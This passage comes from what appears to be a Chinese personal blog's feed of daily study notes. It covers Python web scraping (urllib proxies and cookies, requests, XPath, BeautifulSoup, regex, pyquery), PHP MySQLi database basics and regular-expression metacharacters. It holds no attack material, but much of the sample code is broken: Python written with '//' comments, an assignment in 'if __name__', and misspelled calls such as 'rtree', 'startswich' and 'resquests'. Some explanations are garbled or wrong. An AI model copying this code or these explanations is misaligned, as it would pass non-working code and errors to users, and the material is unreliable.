ProxyHandlerproxy=ProxyHandler(&#123;&#39;协议类型http/https&#39;:&#39;IP地址:端口&#39;&#125;)opener=build_opener(proxy)url=&#39;目标地址&#39;response=opener.open(url)print(response.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h4><p>使用步骤:<br>1.实例化MozillaCookieJar(保存cookie)<br>2.创建handler对象(cookie的处理器)<br>3.创建opener对象<br>4.打开网页发送请求获取响应<br>5.保存cookie文件<br>语法:</p><pre><code>import urllib.requestfrom http import cookiejarfilename=&#39;cookie.txt&#39;def get_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar(filename)           //实例化MCJ    handler=urllib.request.HTTPCookieProcessor(cookie)    //创建handler对象    opener=urllib.request.build_opener(handler)           //创建opener对象    url=&#39;目标地址&#39;    response=opener.open(url)                             //发送请求并获取响应    cookie.save()                                         //保存cookie文件def use_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar()                   //实例化MCJ    cookie.load(filename)                                 //加载cookie文件    print(cookie)if __name__ = &#39;__main__&#39;:    use_cookie()                                          //读取cookie</code></pre><h4 id="requests库-包括上面的功能"><a href="#requests库-包括上面的功能" class="headerlink" title="requests库(包括上面的功能)"></a>requests库(包括上面的功能)</h4><pre><code>常用方法:requestsrequests.request(url)            //构造请求requests.get(url,params=None)    //Get请求。params可省略,params是请求的参数requests.post(url,data=None,json=None)requests.head()                  //获取html头部信息requests.put()                   //发送Put请求requests.patch()                 //提交局部修改的请求requests.delete()                //提交删除请求params是请求参数常用属性:response.status_code             //响应状态码response.content                 //response对象转为二进制数据response.text                    //response对象转为字符串数据response.encoding                //定义response对象编码response.cookies()               //获取请求后的cookieresponse.session()               //获取请求后的sessionresponse.url                     //获取请求网址response.json()                  //内置JSON解码器Response.headers                 //以字典对象存储服务器响应头，字典不分大小写获取二进制数据实例:import requestsurl=&#39;目标文件的地址&#39;response=requests.get(url)with open(&#39;文件名,模式&#39;,&#39;wb&#39;) as file:              //读写文件的操作    file.write(response.content)    常用参数:r:   以只读方式打开文件。文件的指针将会放在文件的开头。这是**默认模式**。r+:  打开一个文件用于读写。文件指针将会放在文件的开头。w:   打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。w+:  打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。a:   打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。a+:  打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。rb:  以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。rb+: 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。wb:  以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。wb+: 以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。ab:  以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。ab+: 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。file.read([size])        将文件数据作为字符串返回，可选参数size控制读取的字节数file.readlines([size])   返回文件中行内容的列表，size参数可选file.write(str)          将字符串写入文件file.writelines(strings) 将字符串序列写入文件file.close()             关闭文件file.closed              表示文件已经被关闭，否则为Falsefile.mode                Access文件打开时使用的访问模式file.encoding            文件所使用的编码file.name                文件名file.newlines            未读取到行分隔符时为None，只有一种行分隔符时为一个字符串，当文件有多种类型的行结束符时，则为一个包含所有当前所遇到的行结束的列表file.softspace           为0表示在输出一数据后，要加上一个空格符，1表示不加。这个属性一般程序员用不着，由程序内部使用</code></pre><h4 id="XPath解析数据-lxml库"><a href="#XPath解析数据-lxml库" class="headerlink" title="XPath解析数据(lxml库)"></a>XPath解析数据(lxml库)</h4><p>概述:<br>小型查询语言，在XML文档中查找信息的语言<br>优点:<br>可在XPath中查找信息<br>支持HTML查找<br>可通过元素和属性进行导航<br>XML树形结构和语句与HTML相类似<br>XPath语法点击<a href="https://blog.csdn.net/Victor2code/article/details/108298390?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166877297016782395359090%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166877297016782395359090&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-108298390-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=xpath%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">此处</a><br>代码实现:</p><pre><code>import requestsfrom lxml import etreeurl=&#39;目标地址&#39;headers=&#123;请求头信息，以键值对形式存储&#125;response=requests.get(url,headers)etree=rtree.HTML(response.text)                       //将响应的str类型转换为etree类型A=etree.xpath(&#39;谷歌浏览器中XPath的语句&#39;)              //获取内容B=etree.path(&#39;另一个语句&#39;)for A中定位的元素,B中定位的元素 in zip(A,B)           //遍历打包    print(A中定位的元素, &#39;:&#39; ,B中定位的元素)          //输出</code></pre><h4 id="BeautifulSoup解析数据-bs4库"><a href="#BeautifulSoup解析数据-bs4库" class="headerlink" title="BeautifulSoup解析数据(bs4库)"></a>BeautifulSoup解析数据(bs4库)</h4><p>概述:<br>能从HTML和XML文件中提取数据的库<br>语法:</p><pre><code>                        【Tag对象】print(bs.标签)                       //获取标签print(bs.标签.attrs)                 //获取标签的全部属性print(bs.标签[&#39;属性名&#39;])             //获取属性值print(bs.标签.text)                  //获取标签的文本内容(不包括注释内的)print(bs.标签.string)                //获取标签的文本内容(包括注释内的)                        【CSS选择器】print(bs.select(&#39;ID&#39;))               //ID查找print(bs.select(&#39;classa&#39;))           //classa查找print(bs.select(标签,属性))          //属性查找                        【其他功能】print(bs.find(标签,属性))            //提取首个满足条件的print(bs.find_all(标签,属性))        //提取所有满足条件的</code></pre><p>代码实现:</p><pre><code>import requestsfrom bs4 import BeautifulSoupurl=&#39;目标地址&#39;headers=&#123;头文件键值对&#125;response=requests.get(url,headers)bs=BeautifulSoup(response.text,&#39;html.parser&#39;)               //bs=BeautifulSoup(response.text,&#39;lxml&#39;)二选一使用即可a_list=bs.find_all(&#39;标签&#39;)for a in a_list:    url=a.get(&#39;属性&#39;)    if url==None                                              //以None开头的url无用        continue    if url.startswich(&#39;http&#39;) or url.startswich(&#39;https&#39;)      //保留以http或https开头的url        print(url)</code></pre><h4 id="正则表达式-re库"><a href="#正则表达式-re库" class="headerlink" title="正则表达式(re库)"></a>正则表达式(re库)</h4><p>概述:<br>特殊的字符序列，检查字符串是否与某种模式相匹配<br>正则语法:</p><pre><code>.           //匹配任意字符^           //匹配字符串开头$           //匹配字符串末尾*           //匹配前一个元字符0到多次+           //匹配前一个元字符1到多次?           //匹配前一个元字符0到1次&#123;m&#125;         //匹配前一个元字符m次&#123;m,n&#125;       //匹配前一个元字符m到n次&#123;m,n&#125;?      //匹配前一个元字符m到n次，并去尽可能少的情况\\          //对特殊字符转义[]          //字符集合，匹配其中任意一个字符|           //或(...)       //作为一个元组，findall在有组情况下只显示组的内容</code></pre><p>特殊序列:</p><pre><code>\A          //只在字符串开头匹配\b          //匹配开头或结尾的空字符串\B          //匹配不位于开头或结尾的空字符串\d          //匹配十进制数，[0-9]\D          //匹配非字符数字字符，[^0-9]s           //匹配空白字符，[\t\n\r\f\v]\S          //匹配非空白字符，[^\t\n\r\f\v]\w          //匹配数字字母下划线，[a-z A-Z 0-9]\W          //匹配非数字字母下划线，[^a-z A-Z 0-9]\Z          //只在字符串末尾进行匹配[\u4e00-\u9fa5]         //中文</code></pre><p>正则处理函数:</p><pre><code>re.match(pattern,string,flags=0)                  //从字符串开头匹配模式，成功则返回成功的对象，否则返回Nonere.search(pattern,string,flags=0)                 //扫描整个字符串返回第一个成功匹配的对象，失败则返回Nonere.findall(pattern,string,flags=0)                //获取列表的所有匹配的字符串，以列表形式返回re.sub(pattern,repl,string,count=0,flags=0)       //用于替换字符串的匹配项，没有匹配项则返回没有匹配的字符串re.compile(pattern,[,flag])                       //编译正则表达式，生成正则表达式对象，供match和search函数使用</code></pre><h4 id="爬取并下载视频示例"><a href="#爬取并下载视频示例" class="headerlink" title="爬取并下载视频示例"></a>爬取并下载视频示例</h4><pre><code>import requestsimport reurl=&#39;目标地址&#39;headers=&#123;请求头&#125;response=requests.get(url,headers=headers)                            //发送请求info=re.findall(&#39;标签，配合使用正则表达式&#39;,response.text)             //正则查找所有符合要求的对象lst=[]for item in info:    lst.append(&#39;https:&#39;+item)                                         //将符合条件的对象放入列表中并补全绝对路径count=0for item in lst:    count+=1    response=requests.get(item.headers=headers)                       //将补全的路径再次请求    with open(&#39;存储路径&#39;+str(count)+&#39;后缀&#39;) as file                   //设置下载路径和文件名        file.write(response.content)                                  //将文件存为二进制print(下载完毕)</code></pre><h4 id="pyquery解析数据-pyquery库"><a href="#pyquery解析数据-pyquery库" class="headerlink" title="pyquery解析数据(pyquery库)"></a>pyquery解析数据(pyquery库)</h4><p>概述:<br>是jQuery的Python实现，可以jQuery语法操作解析HTML文档，易用性和解析速度很好<br>初始化方式:</p><pre><code>字符串方式from pyquery import PyQuery as pyhtml=&#39;html代码&#39;doc=py(html)      //创建PyQuery对象，将str类型转换为PyQuery类型url方式from pyquery import PyQuerydoc=PyQuery(url=&#39;地址&#39;,encoding=&#39;utf-8&#39;)文件from pyquery import PyQuerydoc=PyQuery(filename=&#39;存有html文件的地址&#39;)</code></pre><p>使用方式:</p><pre><code>doc(&#39;#main&#39;)                             //获取当前节点doc(&#39;#main&#39;).children()                  //获取子节点doc(&#39;#main&#39;).parent()                    //获取父节点doc(&#39;#main&#39;).sinlings()                  //获取兄弟节点doc(&#39;标签&#39;)attr(&#39;属性&#39;)                  //获取属性值doc(&#39;#main&#39;).html()                      //获取内容，以html代码形式显示doc(&#39;#main&#39;).text()                      //获取内容，以文本显示显示</code></pre><p>代码实现:</p><pre><code>import requestsfrom pyquery import PyQuery as pyurl=&#39;&#39;headers=&#123;&#125;response=resquests.get(url,headers=headers)   //发送请求doc=py(response.text)                         //初始化PyQuery对象A=[x.text for x in doc(h4 a)]                 //从doc中提取h4中的a标签的内容传给x，再显示x的文本部分</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>requests用于发送和接收请求<br>四种解析方式是数据的提取<br>对于爬虫更重要的是提取了数据之后对数据的操作</p><h4 id="2023-3-3补档"><a href="#2023-3-3补档" class="headerlink" title="2023.3.3补档"></a>2023.3.3补档</h4><p>今日发现一个好用的库叫做URLParser，可以去尝试一下</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="想不清楚一件事，往往因为这件事里有你想逃避的东西。"><a href="#想不清楚一件事，往往因为这件事里有你想逃避的东西。" class="headerlink" title="想不清楚一件事，往往因为这件事里有你想逃避的东西。"></a>想不清楚一件事，往往因为这件事里有你想逃避的东西。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql</title>
      <link href="/2022/11/16/20221116/"/>
      <url>/2022/11/16/20221116/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>php7之前是mysql链接(硬链接)<br>php7之后是mysqli链接(i链接/improved链接)</p><h4 id="PHP连接数据库-MySQLi-面向对象"><a href="#PHP连接数据库-MySQLi-面向对象" class="headerlink" title="PHP连接数据库(MySQLi - 面向对象)"></a>PHP连接数据库(MySQLi - 面向对象)</h4><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;echo &quot;Connected successfully&quot;;?&gt;</code></pre><h4 id="关闭连接-MySQLi-面向对象"><a href="#关闭连接-MySQLi-面向对象" class="headerlink" title="关闭连接(MySQLi - 面向对象)"></a>关闭连接(MySQLi - 面向对象)</h4><p>连接在脚本执行完后会自动关闭,也可以手动关闭<br>$conn-&gt;close();</p><h4 id="创建数据库-MySQLi-面向对象"><a href="#创建数据库-MySQLi-面向对象" class="headerlink" title="创建数据库(MySQLi - 面向对象)"></a>创建数据库(MySQLi - 面向对象)</h4><p>需要 CREATE 权限来创建或删除 MySQL 数据库。</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// Create database$sql = &quot;CREATE DATABASE myDB&quot;;                     //库名叫做myDBif ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Database created successfully&quot;;&#125; else &#123;    echo &quot;Error creating database: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><h4 id="创建表-MySQLi-面向对象"><a href="#创建表-MySQLi-面向对象" class="headerlink" title="创建表(MySQLi - 面向对象)"></a>创建表(MySQLi - 面向对象)</h4><p>在 PHP 中创建完数据库之后，我们需要在数据库中创建一个或者多个的数据表。<br>一个数据表有一个唯一名称，并有行和列组成。<br>创建表前，我们需要使用use myDB;来选择要操作的数据库</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;myDB&quot;;// 创建连接$conn = new mysqli($servername, $username, $password, $dbname);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// sql to create table$sql = &quot;CREATE TABLE MyGuests (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,firstname VARCHAR(30) NOT NULL,lastname VARCHAR(30) NOT NULL,email VARCHAR(50),reg_date TIMESTAMP)&quot;;if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Table MyGuests created successfully&quot;;&#125; else &#123;    echo &quot;Error creating table: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><p>其中表内数据类型有<a href="https://www.w3cschool.cn/mysql/sql-datatypes.html">规定</a></p><p>同时可以为每个列指定其他选项的属性:<br>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。<br>DEFAULT value - 设置默认值<br>UNSIGNED - 使用无符号数值类型，0 及正数<br>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1<br>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的 PRIMARY KEY 设置为 ID 数值，与AUTO_INCREMENT 一起使用。</p><p>每个表都应该有一个主键(本列为 “id” 列)，主键必须包含唯一的值。</p><h4 id="插入数据-MySQLi-面向对象"><a href="#插入数据-MySQLi-面向对象" class="headerlink" title="插入数据(MySQLi - 面向对象)"></a>插入数据(MySQLi - 面向对象)</h4><p>语法规则:<br>1.PHP 中 SQL 查询语句必须使用引号<br>2.在 SQL 查询语句中的字符串值必须加引号<br>3.数值的值不需要引号<br>4.NULL 值不需要引号<br>向 MySQL 表添加新的记录:<br>INSERT INTO table_name (column1, column2, column3,…)<br>VALUES (value1, value2, value3,…)</p><pre><code>在连接检测和关闭数据库中间加入$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;                    //向 &quot;MyGuests&quot; 表添加新的记录if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;New record created successfully&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125;</code></pre><h4 id="插入多条数据-MySQLi-面向对象"><a href="#插入多条数据-MySQLi-面向对象" class="headerlink" title="插入多条数据(MySQLi - 面向对象)"></a>插入多条数据(MySQLi - 面向对象)</h4><p>【方法一:使用函数】<br>mysqli_multi_query() 函数可用来执行多条SQL语句。</p><pre><code>$sql = &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Mary&#39;, &#39;Moe&#39;, &#39;mary@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Julie&#39;, &#39;Dooley&#39;, &#39;julie@example.com&#39;)&quot;;if ($conn-&gt;multi_query($sql) === TRUE) &#123;echo &quot;Newrecords created successfully&quot;;&#125; else &#123;echo&quot;Error: &quot; . $sql . &quot;&quot; . $conn-&gt;error;&#125;</code></pre><p>注意:每个SQL语句必须用分号隔开。</p><p>【方法二:MySQLi 使用预处理语句】</p><pre><code>// 为 mysqli_stmt_prepare() 初始化statement 对象$stmt =mysqli_stmt_init($conn);//预处理语句if (mysqli_stmt_prepare($stmt, $sql)) &#123;// 绑定参数mysqli_stmt_bind_param($stmt, &#39;sss&#39;, $firstname, $lastname, $email);// 设置参数并执行$firstname = &#39;John&#39;;$lastname= &#39;Doe&#39;;$email =&#39;john@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Mary&#39;;$lastname= &#39;Moe&#39;;$email =&#39;mary@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Julie&#39;;$lastname = &#39;Dooley&#39;;$email =&#39;julie@example.com&#39;;mysqli_stmt_execute($stmt);&#125;</code></pre><p>每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险。<br>参数类型:<br>i - integer<br>d - double<br>s - string<br>b - BLOB</p><h4 id="MySQLi使用预处理语句-包括面向对象和面向过程"><a href="#MySQLi使用预处理语句-包括面向对象和面向过程" class="headerlink" title="MySQLi使用预处理语句(包括面向对象和面向过程)"></a>MySQLi使用预处理语句(包括面向对象和面向过程)</h4><p>流程:<br>1.预处理:创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记<br>2.数据库解析并编译(内部处理):对SQL语句模板执行查询优化，并存储结果(不输出)<br>3.执行:将应用绑定的值传递给参数（?标记），数据库执行语句。(如果参数的值不一样,可以多次执行语句)</p><p>优点:<br>1.减少了分析时间，只做了一次查询（虽然语句多次执行）<br>2.绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句<br>3.预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p><pre><code>// 步骤一，prepare and bind$stmt = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)&quot;);$stmt-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);// 步骤三，设置参数并执行$firstname = &quot;John&quot;;$lastname = &quot;Doe&quot;;$email = &quot;john@example.com&quot;;$stmt-&gt;execute();$firstname = &quot;Mary&quot;;$lastname = &quot;Moe&quot;;$email = &quot;mary@example.com&quot;;$stmt-&gt;execute();             $firstname = &quot;Julie&quot;;$lastname = &quot;Dooley&quot;;$email = &quot;julie@example.com&quot;;$stmt-&gt;execute();echo &quot;New records created successfully&quot;;$stmt-&gt;close();</code></pre><p>语句中如果有?就转换为其他类型的数据</p><h4 id="读取数据-MySQLi-面向对象"><a href="#读取数据-MySQLi-面向对象" class="headerlink" title="读取数据(MySQLi - 面向对象)"></a>读取数据(MySQLi - 面向对象)</h4><pre><code>SELECT 语句用于从数据表中读取数据:SELECT column_name(s) FROM table_name我们可以使用 * 号来读取所有数据表中的字段:SELECT * FROM table_name用 WHERE 命令来筛选出满足条件的结果:SELECT column_name(s)  FROM table_name  WHERE column_name operator value——————————————————————————————————————————————————————————————————————————————                           【SELECT】$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;;$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) &#123;    // 输出每行数据    while($row = $result-&gt;fetch_assoc()) &#123;        echo &quot;id: &quot;. $row[&quot;id&quot;]. &quot; - Name: &quot;. $row[&quot;firstname&quot;]. &quot; &quot; . $row[&quot;lastname&quot;]. &quot;&lt;br&gt;&quot;;    &#125;&#125; else &#123;    echo &quot;0 results&quot;;&#125;——————————————————————————————————————————————————————————————————————————————                           【WHERE】$result = mysqli_query($con,&quot;SELECT * FROM PersonsWHERE FirstName=&#39;Peter&#39;&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;] . &quot; &quot; . $row[&#39;LastName&#39;];echo &quot;&lt;br&gt;&quot;;&#125;</code></pre><h4 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h4><pre><code>ORDER BY 关键词用于对记录集中的数据进行排序。SELECT column_name(s)FROM table_nameORDER BY column1, column2... ASC|DESC    默认是升序ASC，DESC改为降序$result = mysqli_query($con,&quot;SELECT * FROM Persons ORDER BY age&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;];echo &quot; &quot; . $row[&#39;LastName&#39;];echo &quot; &quot; . $row[&#39;Age&#39;];echo &quot;&lt;br&gt;&quot;;&#125;可以根据多个列进行排序(第一列的值相同时才使用第二列)</code></pre><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>UPDATE 语句用于更新数据库表中已存在的记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:UPDATE table_name SET column1=value, column2=value2,... WHERE some_column=some_value 操作:mysqli_query($con,&quot;UPDATE Persons SET Age=36WHERE FirstName=&#39;Peter&#39; AND LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>DELETE FROM 语句用于从数据库表中删除记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:DELETE FROM table_name WHERE some_column = some_value操作:mysqli_query($con,&quot;DELETE FROM Persons WHERE LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处"><a href="#PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处" class="headerlink" title="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往此处"></a>PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往<a href="https://www.w3cschool.cn/php/php-mysql-connect.html">此处</a></h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我们生而破碎，用活着来修修补补。"><a href="#我们生而破碎，用活着来修修补补。" class="headerlink" title="我们生而破碎，用活着来修修补补。"></a>我们生而破碎，用活着来修修补补。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2022/11/15/20221115/"/>
      <url>/2022/11/15/20221115/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>概念:正则表达式是用于描述字符排列和匹配模式的一种语法规则。<br>作用:<br>1.匹配，也常常用于从字符串中析取信息。<br>2.用新文本代替匹配文本。<br>3.将一个字符串拆分为一组更小的信息块。<br>基本语法:<br>1.正则匹配模式使用分隔符与元字符组成<br>(1)分隔符可以是非数字、非反斜线、非空格的任意字符<br>(2)经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)<br>2.元字符是用于构造规则表达式的具有特殊含义的字符<br>3.如果要在正则表达式中包含元字符本身，必须在其前加上”\”进行转义 </p><pre><code>           【常见元字符】 元字符             说明*                0次、1次或多次匹配其前的原子+                1次或多次匹配其前的原子?                0次或1次匹配其前的原子|                匹配两个或多个选择^                匹配字符串串首的原子$                匹配字符串串尾的原子[]                匹配方括号中的任一原子[^]                匹配除方括号中的原子外的任何字符&#123;m&#125;                表示其前原子恰好出现m次&#123;m,n&#125;            表示其前原子至少出现m次，至少出现n次(n&gt;m)&#123;m,&#125;            表示其前原子出现不少于m次()                整体表示一个原子.                匹配除换行之外的任何一个字符边界限制:1.^和$分别指定字符串的开始和结束。2.^Tom$精确匹配————Tom模糊匹配3.重复匹配:    ?匹配存在?前的一个字母或是不存在这个字母的字符串    *匹配0/1/多次匹配该字母的字符串    +匹配1/多次该字母的字符串    .匹配除换行符外的任何字符    .*组合称为全匹配符或单含匹配符    &#123;&#125;指定原子重复的次数        &#123;m&#125;表示其前原子恰好出现m次；        &#123;m，n&#125;表示其前原子至少出现m次，至多出现n次；        &#123;m，&#125;表示其前原子出现不少于m次。    []匹配其中的一个原子并且地位平等    |匹配多个选择之一，可以连用|4.模式单元:    ()将其中的正则表达式变为原子(或称为模式单元)使用————其实用处相等于数学的括号5.模式匹配的顺序(从高到低):  顺序    元字符         说明  1        （）          模式单元      2       ？* +&#123;&#125;        重复匹配  3         ^$           边界限制  4         |            模式选择</code></pre><p>特殊字符:<br>$匹配输入字符串的结尾位置<br>()标记表达式开始与结束的位置<br>*匹配前面的子表达式0次或多次<br>+匹配前面的子表达式1次或多次<br>.匹配除换行符\n外的任何单字符<br>[标记一个中括号表达式的开始<br>?匹配前面的子表达式0次或一次，或指明一个非贪婪限定符<br>\将下一个字符标记为特殊字符/原义字符/向后引用/八进制转义符<br>^匹配字符串的开始位置(在方括号中表示不接受该字符集合)<br>{标记限定符巴达兽的开始<br>|指明两项之间的一个选择</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="生活哪有什么胜利可言，挺住意味着一切。"><a href="#生活哪有什么胜利可言，挺住意味着一切。" class="headerlink" title="生活哪有什么胜利可言，挺住意味着一切。"></a>生活哪有什么胜利可言，挺住意味着一切。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>元字符表</title>
      <link href="/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/"/>
      <url>/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<pre><code>字符     描述\        将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\’ 匹配 “\” 而 “\(” 则匹配 “(”。^        匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。$        匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。*        匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于&#123;0,&#125;。+        匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 &#123;1,&#125;。?        匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 &#123;0,1&#125;。&#123;n&#125;       n是一个非负整数。匹配确定的 n 次。例如，’o&#123;2&#125;’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。&#123;n,&#125;      n是一个非负整数。至少匹配n 次。例如，’o&#123;2,&#125;’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o&#123;1,&#125;’ 等价于 ‘o+’。’o&#123;0,&#125;’ 则等价于 ‘o*’。&#123;n,m&#125;     m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o&#123;1,3&#125;” 将匹配 “fooooood” 中的前三个 o。’o&#123;0,1&#125;’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。?         当该字符紧跟在任何一个其他限制符 (*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125;) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。.         匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。(pattern)    匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘′或‘’。(?:pattern)    匹 配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。(?=pattern)    正 